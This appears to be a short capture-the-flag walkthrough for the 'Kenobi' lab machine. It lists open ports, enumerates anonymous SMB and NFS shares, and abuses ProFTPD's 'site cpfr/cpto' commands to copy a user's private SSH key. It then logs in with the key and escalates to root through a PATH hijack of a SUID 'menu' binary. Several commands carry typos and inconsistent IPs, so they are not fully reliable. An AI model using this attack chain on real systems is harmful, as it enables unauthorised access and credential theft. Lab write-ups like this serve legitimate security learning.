# Kenobi
```
export ip = 10.10.116.211
```

# What point is port?
```
21 ftp
22 SSH
80 Http
111 rpcbind
445 SMB 
2049 NFS
```

# Enumerate
## SMB 
```
1. smbmap -H export_ip -R
[+] Guest session       IP: 10.10.49.198:445    Name: 10.10.49.198                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY
        .\anonymous\*
        dr--r--r--                0 Wed Sep  4 06:49:09 2019    .
        dr--r--r--                0 Wed Sep  4 06:56:07 2019    ..
        fr--r--r--            12237 Wed Sep  4 06:49:09 2019    log.txt
        IPC$                                                    NO ACCESS       IPC Service (kenobi server (Samba, Ubuntu))


2. smblcient \\\\export_ip\\anonymous
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:56:07 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877088 blocks available
smb: \> ^C

```
## FTP
```
1. searchsploit proftp

2. nc export_ip 21

3. proftpd Vulnerable
- site cpfr /home/kenobi/.ssh/id_rsa
- site cpto /var/tmp/id_rsa


```
## NFS 
```
[+] NFS Mound Command
mount export_ip:/var ./mnt
1. cp /tmp/id_rsa ../../


[+] Mac Mount Command
mount -t nfs -o nolock,resvport,rw,nfc {IP}:/home/test/nfs nfs

```
# Exploitation
## SSH
```
1. chmod +x id_rsa
2. ssh -i id_rsa kenobi@export_ip
```

# Privilege Escalate
```
1. find / -perm -4000 2>/dev/null
- /usr/bin/menu


2. echo /bin/sh > curl
- chmod 777
- export PATH=/tmp:$PATH

3. ./menu
- select 1

```